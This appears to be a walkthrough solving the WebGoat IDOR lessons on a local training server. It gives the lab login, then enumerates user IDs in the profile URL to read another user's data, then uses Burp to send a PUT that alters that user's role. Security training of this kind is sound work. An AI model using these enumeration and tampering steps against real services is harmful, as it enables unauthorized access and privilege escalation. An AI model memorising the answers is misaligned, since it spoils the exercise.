# Task 2

1. Just login as tom
   login

```
tom
```

password

```
cat
```

2. Done XD

# Task 3

1. Open browser network tab
2. Click on "view profile" button
3. Click on "profile" response

```
{
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}
```

4. There are two missed keys

```
userId, role
```

# task 4

1. We have to get route for profile request
2. Go to exercise 3, open network tab in browser and click button view profile.
3. As we can see in header section

```
Request URL: http://localhost:8080/WebGoat/IDOR/profile

```

Get userId from response tab. Example

```
{
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}
```

4. Go back to exercise 4
5. Combine info into one path

```
WebGoat/IDOR/profile/2342384
```

# Task 5

Having knowledge that url looks like

```
http://localhost:8080/WebGoat/IDOR/profile/{id}
```

Where id colud be anything, just bruteforce

1. Start from http://localhost:8080/WebGoat/IDOR/profile/2342380
2. Change last digit in id
3. ...
4. in this example 2342388 was lucky

Final url is

```
http://localhost:8080/WebGoat/IDOR/profile/2342388
```

that shows output

```
{
  "lessonCompleted" : true,
  "feedback" : "Well done, you found someone else's profile",
  "output" : "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}",
  "assignment" : "IDORViewOtherProfile",
  "attemptWasMade" : true
}
```

## In second part

1. Copy previously gaind data :

```
{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}
```

2. Go to Webgoat and turn on interception on burp tool
3. Click button ( 2nd view profile)
4. Intercept
5. Find GET request ( Webgoat/IDOR/profile/....)
6. Send to repeater
7. Change GET to PUT
8. Change Content-Type to: application/json;charset=UTF-8
9. Add body as json found previously

```
{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}
```

10. Response will say you are close
11. Try to change color and role
12. Try

```
{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}

```
